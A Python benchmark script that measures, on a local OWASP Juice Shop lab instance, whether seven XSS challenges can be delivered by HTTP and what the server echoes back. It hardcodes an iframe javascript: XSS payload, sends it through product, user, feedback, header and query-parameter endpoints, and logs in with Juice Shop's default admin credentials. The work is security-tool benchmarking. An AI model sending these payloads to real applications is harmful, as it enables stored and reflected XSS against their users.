#!/usr/bin/env python
"""Per-challenge DELIVERY FACT TABLE on the official Juice Shop target.

The 2026-11-09 external run covered only 2 of the 9 XSS challenges listed in
the target's own ``data/static/challenges.yml``.  This runner measures, one by
one, whether the other 7 can even be *delivered* on this deployment, and what
the server actually echoes back.  It does NOT measure exploitation: a stored
payload in a JSON field is not proof that an SPA renders it, and a browser-
executed sink needs its own Playwright evidence.  Therefore:

  * no TP/FP/TN/FN, no precision/recall/F1, no "who solved what";
  * a challenge whose prerequisite is missing is recorded ``blocked`` with a
    reason, is never sent, and never enters any denominator;
  * ``fragment_only`` rows state the objective fact that the injection point
    lives in a URL fragment, which no HTTP request can carry;
  * the two already-covered challenges are listed for completeness only.

Ground truth (names, keys, difficulty, disabledEnv, and the bonus payload)
is read from the target's OWN answer key, never typed in from memory.

Usage::

    NO_PROXY=127.0.0.1,localhost .venv/Scripts/python.exe \
        benchmark/run_juice_challenges.py \
        --tree "$(git rev-parse --short HEAD)" \
        --out benchmark/results/juice_challenges_20261110.json

Requires the Juice Shop target to be up (dev/juiceshop_external.py serve).
Side effects on the local target are documented and reverted where possible.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import pathlib
import re
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timezone
from html import unescape
from urllib.parse import quote

import requests
import yaml

_HERE = pathlib.Path(__file__).resolve().parent
_ROOT = _HERE.parent
_KEY_FILE = (_ROOT / "dev" / "_juiceshop" / "app" / "juice-shop_20.2.0"
             / "data" / "static" / "challenges.yml")

#: The exact attack string used by seven of the nine official challenges.
OFFICIAL_PAYLOAD = '<iframe src="javascript:alert(`xss`)">'
ALREADY_COVERED = ("localXssChallenge", "reflectedXssChallenge")
SCORING_POLICY = (
    "FACT TABLE ONLY. Delivery reachability and server echoes are measured; "
    "no TP/FP/TN/FN, precision, recall or F1, and no exploitation verdict. "
    "A stored string in a JSON field is not a rendered XSS."
)

#: One plan per UNCOVERED official challenge.  ``blocked`` means the runner
#: deliberately does not send anything, and must carry a non-empty reason.
PLANS = (
    ("restfulXssChallenge", "http_json", "PUT", "/api/Products/1",
     "/api/Products/1", True),
    ("persistedXssUserChallenge", "http_json", "POST", "/api/Users",
     "/api/Users", False),
    ("persistedXssFeedbackChallenge", "http_json", "POST", "/api/Feedbacks",
     "", False),
    ("httpHeaderXssChallenge", "http_header", "GET", "/rest/saveLoginIp",
     "jwt:lastLoginIp", True),
    ("usernameXssChallenge", "http_query", "GET", "/public/legacy.html",
     "", False),
    ("videoXssChallenge", "not_attempted", "", "", "", False),
    ("xssBonusChallenge", "url_fragment", "", "", "/#/search", False),
)

BLOCKED_REASON = {
    "videoXssChallenge": (
        "The official hints state this requires the file-write vulnerability "
        "behind another 6-star challenge; that prerequisite was not obtained "
        "on this deployment, so no request was sent and nothing is inferred."),
}


def _git_head(explicit: str = "") -> str:
    """Provenance must be real: an unavailable ``git`` is an ABORT, not
    ``"unknown"``.  This sandbox blocks git launched from a Python child
    process (WinError 5), so the caller passes the hash from its own shell.
    """
    tree = explicit or os.environ.get("XS_TREE", "")
    if not tree:
        try:
            tree = subprocess.run(
                ["git", "rev-parse", "--short", "HEAD"], cwd=str(_ROOT),
                capture_output=True, text=True, timeout=15).stdout.strip()
        except Exception as exc:                         # noqa: BLE001
            raise RuntimeError(
                "cannot determine git HEAD here; pass --tree / XS_TREE "
                f"({type(exc).__name__}: {exc})") from exc
    if not re.fullmatch(r"[0-9a-f]{7,40}", tree):
        raise RuntimeError(f"refusing to publish a fake tree: {tree!r}")
    return tree


def _answer_key() -> tuple[dict, str]:
    rows = yaml.safe_load(_KEY_FILE.read_text(encoding="utf-8"))
    xss = {c["key"]: c for c in rows
           if str(c.get("category", "")).upper() == "XSS"}
    bonus = xss["xssBonusChallenge"]["description"]
    match = re.search(r"<iframe[^>]*>.*?</iframe>", unescape(bonus),
                      re.S | re.I)
    if not match:
        raise AssertionError("ABORT: bonus payload missing from answer key")
    return xss, match.group(0)


def _login(base: str, session: requests.Session) -> tuple[dict, str]:
    r = session.post(base + "/rest/user/login",
                     json={"email": "admin@juice-sh.op",
                           "password": "admin123"}, timeout=10)
    r.raise_for_status()
    token = r.json()["authentication"]["token"]
    return {"Authorization": "Bearer " + token,
            "Content-Type": "application/json"}, token


def _jwt_data(token: str) -> dict:
    part = token.split(".")[1]
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part)).get("data", {})


def _captcha_answer(expr: str) -> int:
    if not re.fullmatch(r"[0-9+\-*/() ]+", expr):
        raise ValueError("captcha expression has unexpected characters")
    return int(round(float(eval(expr, {"__builtins__": {}}, {}))))  # noqa: S307


def _head(text: str, limit: int = 400) -> str:
    return " ".join((text or "").split())[:limit]


def _json_field(text: str, field: str) -> str | None:
    """Value the server reports as stored, AFTER JSON decoding.

    ``payload in r.text`` is wrong for JSON: quotes are escaped there, so a
    stored payload looks like ``<iframe src=\\"...\\">`` and a raw substring
    check silently reports False.  Compare the decoded field value instead.
    """
    try:
        obj = json.loads(text)
    except (ValueError, TypeError):
        return None
    if not isinstance(obj, dict):
        return None
    data = obj.get("data", obj)
    if not isinstance(data, dict) or field not in data:
        return None
    return str(data[field])


def _carries(text: str, payload: str, field: str | None) -> tuple[bool, str]:
    if field:
        value = _json_field(text, field)
        if value is not None:
            return value == payload, _head(value, 160)
    escaped = json.dumps(payload)[1:-1]
    return (payload in text or escaped in text), ""


def _row(key: str, challenge: dict, plan: tuple) -> dict:
    _, shape, method, path, view, auth = plan
    return {
        "key": key,
        "name": challenge["name"],
        "difficulty": challenge["difficulty"],
        "disabled_env": challenge.get("disabledEnv") or [],
        "delivery_shape": shape,
        "http_reachable": shape.startswith("http_"),
        "http_request_sent": False,
        "method": method,
        "path": path,
        "view": view,
        "request_status": None,
        "view_status": None,
        "payload_in_response": None,
        "payload_in_view": None,
        "jwt_snapshot_contains_payload": None,
        "server_echo_value": None,
        "csp_header": None,
        "verdict": "blocked",
        "reason": "",
        "response_head": "",
    }


def _scan_bonus(base: str, bonus: str) -> dict:
    """One real XSSentinel CLI run; reported as a fact, never as a score."""
    url = base + "/#/search?q=" + quote(bonus, safe="")
    fd, out_path = tempfile.mkstemp(suffix=".json", prefix="xt381_")
    os.close(fd)
    cmd = [sys.executable, "-m", "xssentinel", "-u", url,
           "-f", "json", "-o", out_path, "--progress", "none",
           "--log-level", "error", "--max-payloads", "14",
           "--max-transforms", "12", "--threads", "2", "--timeout", "10"]
    t0 = time.time()
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              encoding="utf-8", errors="replace",
                              timeout=120, cwd=str(_ROOT))
        findings = []
        try:
            report = json.loads(pathlib.Path(out_path).read_text(
                encoding="utf-8"))
            findings = [f.get("type") for f in report.get("findings", [])]
        except (OSError, ValueError, AttributeError):
            findings = []
        return {"url": url, "rc": proc.returncode,
                "secs": round(time.time() - t0, 2),
                "finding_types": findings,
                "stdout_head": _head(proc.stdout or "", 160)}
    except subprocess.TimeoutExpired:
        return {"url": url, "rc": None, "secs": 120.0,
                "finding_types": [], "stdout_head": "TIMEOUT"}
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _attempt(key: str, row: dict, base: str,
            session: requests.Session, auth: dict, bonus: str) -> dict:
    payload = OFFICIAL_PAYLOAD
    try:
        if key == "restfulXssChallenge":
            original = session.get(base + "/api/Products/1",
                                   timeout=10).json()["data"]["description"]
            r = session.put(base + "/api/Products/1", headers=auth,
                            json={"description": payload}, timeout=10)
            v = session.get(base + "/api/Products/1", timeout=10)
            in_resp, echo = _carries(r.text, payload, "description")
            in_view, echo_v = _carries(v.text, payload, "description")
            row.update(http_request_sent=True, request_status=r.status_code,
                       response_head=_head(r.text), view_status=v.status_code,
                       payload_in_response=in_resp, payload_in_view=in_view,
                       server_echo_value=echo or echo_v)
            # Revert the one mutable product field we touched.
            session.put(base + "/api/Products/1", headers=auth,
                        json={"description": original}, timeout=10)
            row["reverted"] = True
        elif key == "persistedXssUserChallenge":
            email = f"phase381_{int(time.time())}@juice-sh.op"
            body = {"email": email, "password": "Phase381!",
                    "username": payload, "role": "customer"}
            r = session.post(base + "/api/Users", json=body, timeout=10)
            v = session.get(base + "/api/Users", headers=auth, timeout=10)
            in_resp, echo = _carries(r.text, payload, "username")
            # The list endpoint contains users written by EARLIER runs.  A
            # raw substring hit there would be measurement contamination, so
            # only THIS request's own response is evidence for this row.
            row.update(http_request_sent=True, request_status=r.status_code,
                       response_head=_head(r.text), view_status=v.status_code,
                       payload_in_response=in_resp, payload_in_view=None,
                       server_echo_value=echo,
                       note=("registered one throwaway local user; the "
                             "/api/Users list is NOT used as readback"))
        elif key == "persistedXssFeedbackChallenge":
            cap = session.get(base + "/rest/captcha", timeout=10).json()
            answer = str(cap.get("answer", _captcha_answer(
                str(cap["captcha"]))))
            body = {"comment": payload, "rating": 5,
                    "captchaId": cap["captchaId"], "captcha": answer}
            r = session.post(base + "/api/Feedbacks", json=body, timeout=20)
            in_resp, echo = _carries(r.text, payload, "comment")
            row.update(http_request_sent=True, request_status=r.status_code,
                       response_head=_head(r.text),
                       payload_in_response=in_resp,
                       payload_in_view=None, server_echo_value=echo,
                       note="server echo of the stored comment is the readback")
        elif key == "httpHeaderXssChallenge":
            r = session.get(base + "/rest/saveLoginIp",
                            headers={**auth, "True-Client-IP": payload},
                            timeout=10)
            _, fresh = _login(base, session)
            snapshot = str(_jwt_data(fresh).get("lastLoginIp", ""))
            in_resp, echo = _carries(r.text, payload, "lastLoginIp")
            row.update(http_request_sent=True, request_status=r.status_code,
                       response_head=_head(r.text),
                       payload_in_response=in_resp, payload_in_view=None,
                       jwt_snapshot_contains_payload=payload in snapshot,
                       server_echo_value=echo or _head(snapshot, 160),
                       note=("fresh-login JWT lastLoginIp is a SUPPLEMENTARY "
                             "fact; only this request's response decides "
                             "the verdict"))
        elif key == "usernameXssChallenge":
            r = session.get(base + "/public/legacy.html",
                            params={"username": payload}, timeout=10)
            csp = r.headers.get("Content-Security-Policy")
            if not csp:
                m = re.search(r'<meta[^>]+Content-Security-Policy[^>]+>',
                              r.text, re.I)
                csp = m.group(0)[:240] if m else None
            in_resp, echo = _carries(r.text, payload, None)
            row.update(http_request_sent=True, request_status=r.status_code,
                       response_head=_head(r.text),
                       payload_in_response=in_resp,
                       payload_in_view=None, server_echo_value=echo,
                       csp_header=csp,
                       note="legacy page + username param probe only")
        elif key == "xssBonusChallenge":
            row["xssentinel"] = _scan_bonus(base, bonus)
            row["note"] = "official bonus payload on the same DOM sink"
        else:
            raise AssertionError(f"no plan for {key}")
    except Exception as exc:                             # noqa: BLE001
        row["verdict"] = "error"
        row["reason"] = f"{type(exc).__name__}: {str(exc)[:180]}"
        return row

    if key in BLOCKED_REASON:
        row["verdict"] = "blocked"
        row["reason"] = BLOCKED_REASON[key]
    elif key == "xssBonusChallenge":
        row["verdict"] = "fragment_only"
        row["reason"] = ("The injection point is in the URL fragment; no "
                         "HTTP request can carry it (objective URL shape).")
    elif row["request_status"] is not None and row["request_status"] >= 400:
        row["verdict"] = "error"
        row["reason"] = f"HTTP {row['request_status']} on delivery"
    elif row["payload_in_response"]:
        row["verdict"] = "delivered"
        row["reason"] = ("this request's own response reported the exact "
                         "payload in a decoded field (stored, NOT proven "
                         "rendered)")
    else:
        row["verdict"] = "accepted_not_reflected"
        row["reason"] = ("2xx accepted the request, but the decoded readback "
                         "does not equal the payload (sanitized, rewritten, "
                         "or not reflected); see server_echo_value")
    return row


def run(base: str, tree: str = "") -> dict:
    challenges, bonus = _answer_key()
    session = requests.Session()
    auth, _ = _login(base, session)
    rows = []
    for key, shape, method, path, view, needs_auth in PLANS:
        row = _row(key, challenges[key],
                   (key, shape, method, path, view, needs_auth))
        if key in BLOCKED_REASON:
            row["reason"] = BLOCKED_REASON[key]
            rows.append(row)
            continue
        rows.append(_attempt(key, row, base, session, auth, bonus))
    counts: dict[str, int] = {}
    for row in rows:
        counts[row["verdict"]] = counts.get(row["verdict"], 0) + 1
    return {
        "generated_utc": datetime.now(timezone.utc).isoformat(
            timespec="seconds"),
        "tree": _git_head(tree),
        "target": base,
        "answer_key_file": str(_KEY_FILE.relative_to(_ROOT)).replace("\\", "/"),
        "scoring_policy": SCORING_POLICY,
        "official_payload": OFFICIAL_PAYLOAD,
        "bonus_payload_from_answer_key": bonus,
        "official_xss_challenge_count": len(challenges),
        "already_covered": list(ALREADY_COVERED),
        "uncovered_measured": len(rows),
        "counts": counts,
        "rows": rows,
    }


def to_markdown(data: dict) -> str:
    lines = [
        "# Per-challenge DELIVERY facts on a real application (FACT TABLE)",
        "",
        f"- generated (UTC): `{data['generated_utc']}`",
        f"- tree: `{data['tree']}` / target: `{data['target']}`",
        f"- answer key: `{data['answer_key_file']}`",
        f"- official XSS challenges: {data['official_xss_challenge_count']}; "
        f"already covered by the 2026-11-09 run: "
        f"{', '.join(data['already_covered'])}",
        "",
        "> **" + data["scoring_policy"] + "**",
        "",
        "## Delivery facts (one row per uncovered official challenge)",
        "",
        "| key | difficulty | shape | HTTP reachable | sent | req | view | "
        "payload in resp / view | server echo | verdict |",
        "|---|---|---|---|---|---|---|---|---|---|",
    ]
    for r in data["rows"]:
        echo = (r["server_echo_value"] or "—").replace("|", "\\|")[:80]
        lines.append(
            f"| `{r['key']}` | {r['difficulty']} | `{r['delivery_shape']}` | "
            f"{r['http_reachable']} | {r['http_request_sent']} | "
            f"{r['request_status'] or '—'} | {r['view_status'] or '—'} | "
            f"{r['payload_in_response']} / {r['payload_in_view']} | "
            f"`{echo}` | `{r['verdict']}` |")
    lines += ["", "## Reasons and server echoes", ""]
    for r in data["rows"]:
        lines.append(f"- **`{r['key']}`** ({r['name']}): {r['reason']}")
        if r["response_head"]:
            lines.append(f"  - response: `{r['response_head'][:180]}`")
        if r.get("server_echo_value"):
            echo = r["server_echo_value"].replace("|", "\\|")
            lines.append(f"  - decoded server echo: `{echo}`")
        if r.get("csp_header"):
            lines.append(f"  - CSP: `{r['csp_header']}`")
        if r.get("jwt_snapshot_contains_payload") is not None:
            lines.append("  - supplementary JWT lastLoginIp snapshot "
                         f"contains payload: "
                         f"{r['jwt_snapshot_contains_payload']}")
        if r.get("xssentinel"):
            s = r["xssentinel"]
            lines.append(f"  - XSSentinel CLI (fact, not a verdict): rc="
                         f"{s['rc']}, {s['secs']}s, finding types="
                         f"{s['finding_types']}")
    lines += ["", "## Counts (NOT a confusion matrix)", "",
              "| verdict | rows |", "|---|---|"]
    for verdict, n in sorted(data["counts"].items()):
        lines.append(f"| `{verdict}` | {n} |")
    lines += [
        "",
        "## Why no score",
        "",
        "1. These seven are not seven independent targets and not seven "
        "comparable cases: two are hash-route/fragment shaped, four need an "
        "authenticated write followed by an SPA render, and one needs a "
        "separate 6-star file-write prerequisite.",
        "2. This runner measures DELIVERY and server echoes only. A payload "
        "stored in a JSON field says nothing about whether the SPA renders "
        "it as HTML; browser execution needs its own Playwright evidence "
        "and is deliberately not claimed here.",
        "3. A blocked row was never sent. Counting it as a miss, or turning "
        "`delivered` into a true positive, would fabricate a denominator. "
        "No TP/FP/TN/FN, precision, recall or F1 is produced.",
        "4. The 2026-11-09 five-surface run and the 2026-11-10 cross-tool "
        "table used different configurations (`--headless` vs gate budgets); "
        "none of them are merged into this table.",
        "5. Only each request's OWN response decides a verdict. Persisted "
        "state from earlier runs (a user list, a login-IP snapshot) is kept "
        "as supplementary information, never as this run's evidence.",
        "",
    ]
    return "\n".join(lines)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--base", default=os.environ.get(
        "XS_JUICE_BASE", "http://127.0.0.1:18900"))
    ap.add_argument("--out", default=str(
        _ROOT / "benchmark" / "results" / "juice_challenges_latest.json"))
    ap.add_argument("--md", default="")
    ap.add_argument("--tree", default=os.environ.get("XS_TREE", ""),
                    help="git short hash of the run tree (required here: "
                         "git inside a Python child is blocked by sandbox)")
    args = ap.parse_args()
    data = run(args.base, args.tree)
    out = pathlib.Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(data, indent=2, ensure_ascii=False),
                   encoding="utf-8")
    md = pathlib.Path(args.md) if args.md else out.with_suffix(".md")
    md.write_text(to_markdown(data), encoding="utf-8")
    print(f"[+] json: {out}\n[+] md:   {md}", flush=True)
    for r in data["rows"]:
        print(f"  {r['key']:<32} {r['verdict']:<26} "
              f"req={r['request_status']} echoed="
              f"{r['payload_in_view'] or r['payload_in_response']}",
              flush=True)
    print(json.dumps(data["counts"], indent=2), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
